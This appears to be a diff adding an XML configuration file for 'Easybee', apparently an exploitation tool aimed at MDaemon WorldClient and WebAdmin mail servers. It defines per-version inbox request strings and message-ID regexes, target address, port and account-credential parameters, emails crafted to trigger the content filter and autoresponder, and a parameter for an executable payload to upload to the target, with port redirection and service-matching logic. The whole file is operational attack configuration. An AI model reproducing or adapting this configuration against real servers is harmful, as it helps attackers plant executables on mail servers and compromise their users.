@@ -1,0 +1,201 @@
+<?xml version="1.0"?>
+<t:config id="d9d52d9866d564e35cfcd46994b1a0882546df0e"
+          name="Easybee"
+          version="1.0.1"
+          configversion="1.0.1.0"
+          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+          xmlns:t='tc0'>
+
+   <t:inputparameters>
+
+      <!-- Parameters for specific versions -->
+      <!--
+      //versionspecificGetInbox - Seemingly fixed string appended to URL to select the Inbox
+      //For  9.6.x: "View=List&ContentType=javascript&ReturnJavaScript=1&FolderID=1&Page=0&currentRequest=0"
+      // could use: "View=List&Folder=Inbox"
+      //For 10.0.x: "view=List&ReturnJavaScript=1&FolderID=0&ReturnDif=Yes&XMLHTTP=1"
+
+      //versionspecificGetMsgID - Give it a subject-line identifier string, it selects the message identifier number
+      //There are two observed formats.  One appears to come from the "diff" response, and the other from the "full" response.
+      //M({n:4, i:1, unr:1, del:0, att:0, urg:0, bnw:0, frw:0, rpl:0, frm:"joe shmoo", sbj:"Autoresponder Trigger 0188439095", dt:"03/16/2009 10:53 AM", sz:9});
+      //scripts.push({id:2, i:0, unr:1, del:0, att:0, urg:0, bnw:1, frw:0, rpl:0, frm:"Joe Shmoo", sbj:"Autoresponder Trigger 1025304777", dt:"01/08/2009 03:01 PM", sz:4,depth:0, hasChildren:0});
+      //use:  <t:parameter name="versionspecificGetMsgID" description="" type="String" value="\({[^\n})]*\b(?:id|n):([0-9]+),[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);" hidden="true" />
+
+	  //also,
+	  //<td><a name="3" href="/WorldClient.dll?Session=PXTSWDE&amp;View=Message&amp;Number=3&amp;Page=1"><strong>Autoresponder Trigger xKwwQoQwG1</strong></a></td>
+	  //use:  View=Message&(?:amp;)*Number=([0-9]+)&(?:amp;)*Page=[0-9]*#x22;[^>]*>[^<]*<strong>%s</strong>
+      -->
+      <t:paramchoice name="WorldClientVersion" description="The version of WorldClient used by the target">
+
+         <t:paramgroup name="9.5.2" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+
+         <t:paramgroup name="9.6.0" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="9.6.1" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="9.6.2" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="9.6.3" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="9.6.4" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="9.6.5" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="9.6.6" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="View=List&amp;amp;amp;ContentType=javascript&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=1&amp;amp;amp;Page=0&amp;amp;amp;currentRequest=0" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+
+		 <!--This program does not work on Version 10.0.0, but the input parameters are the same as the other 10.0.x versions-->
+         <t:paramgroup name="10.0.1" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="10.0.2" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="10.0.3" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="10.0.4" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="10.0.5" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+
+         <t:paramgroup name="10.1.0" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="10.1.1" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+         <t:paramgroup name="10.1.2" description="">
+            <t:parameter name="versionspecificGetInbox" description="" type="String" value="view=List&amp;amp;amp;ReturnJavaScript=1&amp;amp;amp;FolderID=0&amp;amp;amp;ReturnDif=Yes&amp;amp;amp;XMLHTTP=1" hidden="true" />
+            <t:parameter name="versionspecificGetMsgID" description="" type="String" value="(?:(?:\({[^\n})]*\b(?:id|n):)|(?:View=Message&amp;amp;amp;amp;*Number=))([0-9]+)(?:(?:,[^\n})]*\bsbj:&#x22;%s&#x22;[^\n})]*}\);)|(?:&amp;amp;amp;amp;*Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))" hidden="true" />
+         </t:paramgroup>
+
+      </t:paramchoice>
+   
+      <!-- Parameters for the target machine -->
+      <t:parameter name="TargetIp"             type="IPv4"    description="Target IPv4 Address (dot notation)"            />
+      <t:parameter name="TargetWCPort"         type="TcpPort" description="Target Port Number for WorldClient connection" />
+      <t:parameter name="TargetWAPort"         type="TcpPort" description="Target Port Number for WebAdmin connection"    />
+   
+      <!-- Parameters for the WorldClient server -->
+      <t:parameter name="WorldClientProtocol"  type="String"  description="WorldClient Protocol (http, https)"              binding="//service[product/name='MDaemon WorldClient']/name" />  <!--  Replace this with an explicit choice of only "http" or "https" -->
+      <t:parameter name="WorldClientDomain"    type="String"  description="WorldClient Address (domain name or IP address)" binding="//identifier"                                       />
+      <t:parameter name="WorldClientPort"      type="TcpPort" description="WorldClient Port Number"                         binding="//service[product/name='MDaemon WorldClient']/port" />
+   
+      <!-- Parameters for the WebAdmin server -->
+      <t:parameter name="WebAdminProtocol"     type="String"  description="WebAdmin Protocol (http, https)"                 binding="//service[product/name='MDaemon WebAdmin']/name"    />  <!--  Replace this with an explicit choice of only "http" or "https" -->
+      <t:parameter name="WebAdminDomain"       type="String"  description="WebAdmin Address (domain name or IP address)"    binding="//identifier"                                       />
+      <t:parameter name="WebAdminPort"         type="TcpPort" description="WebAdmin Port Number"                            binding="//service[product/name='MDaemon WebAdmin']/port"    />
+
+      <!-- Parameters for the target account -->
+      <t:parameter name="TargetAcctDomain"     type="String"  description="Target account email domain"/>
+      <t:parameter name="TargetAcctUsr"        type="String"  description="Target account username"/>
+      <t:parameter name="TargetAcctPwd"        type="String"  description="Target account password"/>
+      <t:parameter name="TargetAcctIsAdmin"    type="String"  description="Target account administrator status"/>
+
+      <!-- Parameters for the email triggering the content filter -->
+      <t:parameter name="CFEmailFrom"          type="String"  description="Asserted sender for email triggering the content filter"/>
+      <t:parameter name="CFEmailSubj"          type="String"  description="Subject line for email triggering the content filter"/>
+      <t:parameter name="CFEmailFile"          type="String"  description="Filename of attachment (executable payload) on email triggering the content filter"/>
+   
+      <!-- Parameters for the email triggering the auto responder -->
+      <t:parameter name="AREmailFrom"          type="String"  description="Asserted sender for email triggering the auto responder"/>
+      <t:parameter name="AREmailSubj"          type="String"  description="Subject line for email triggering the auto responder"/>
+
+      <!-- Parameters for the (pass through) email not triggering the content filter of auto responder -->
+      <t:parameter name="PTEmailFrom"          type="String"  description="Asserted sender for email ignored by content filter"/>
+      <t:parameter name="PTEmailSubj"          type="String"  description="Subject line for email ignored by content filter"/>
+
+      <!-- Parameters for the payload -->
+      <t:parameter name="PayloadName"          type="String"  description="Filename for executable payload once on the target"/>
+      <t:parameter name="PayloadFile"          type="String"  description="Path to payload to be uploaded to the target"/>
+
+   </t:inputparameters>
+
+   <t:redirection>
+      <t:local protocol="TCP"
+               listenaddr="TargetIp"
+               listenport="TargetWCPort"
+               destaddr="//identifier"
+               destport="//service[product/name='MDaemon WorldClient']/port"
+               closeoncompletion="true"/>
+      <t:local protocol="TCP"
+               listenaddr="TargetIp"
+               listenport="TargetWAPort"
+               destaddr="//identifier"
+               destport="//service[product/name='MDaemon WebAdmin']/port"
+               closeoncompletion="true"/>
+   </t:redirection>
+
+   <t:logic>
+      <t:and>
+
+         <t:or>
+            <t:service name="https">
+               <t:product name="MDaemon WorldClient" />
+<!--
+               <t:bindtovalue name="WorldClientProtocol" value="https"/>
+               <t:bindtopath  name="WorldClientDomain"   path="//identifier"/>
+               <t:bindtopath  name="WorldClientPort"     path="//service[product/name='MDaemon WorldClient']/port"/>
+-->
+            </t:service>
+
+            <t:service name="http">
+               <t:product name="MDaemon WorldClient" />
+<!--
+               <t:bindtovalue name="WorldClientProtocol" value="http"/>
+               <t:bindtopath  name="WorldClientDomain"   path="//identifier"/>
+               <t:bindtopath  name="WorldClientPort"     path="//service[product/name='MDaemon WorldClient']/port"/>
+-->
+            </t:service>
+         </t:or>
+
+         <t:or>
+            <t:service name="https">
+               <t:product name="MDaemon WebAdmin" />
+<!--
+               <t:bindtovalue name="WebAdminProtocol"    value="https"/>
+               <t:bindtopath  name="WebAdminDomain"      path="//identifier"/>
+               <t:bindtopath  name="WebAdminPort"        path="//service[product/name='MDaemon WebAdmin']/port"/>
+-->
+            </t:service>
+
+            <t:service name="http">
+               <t:product name="MDaemon WebAdmin" />
+<!--
+               <t:bindtovalue name="WebAdminProtocol"    value="http"/>
+               <t:bindtopath  name="WebAdminDomain"      path="//identifier"/>
+               <t:bindtopath  name="WebAdminPort"        path="//service[product/name='MDaemon WebAdmin']/port"/>
+-->
+            </t:service>
+         </t:or>
+
+      </t:and>
+   </t:logic>
+</t:config>
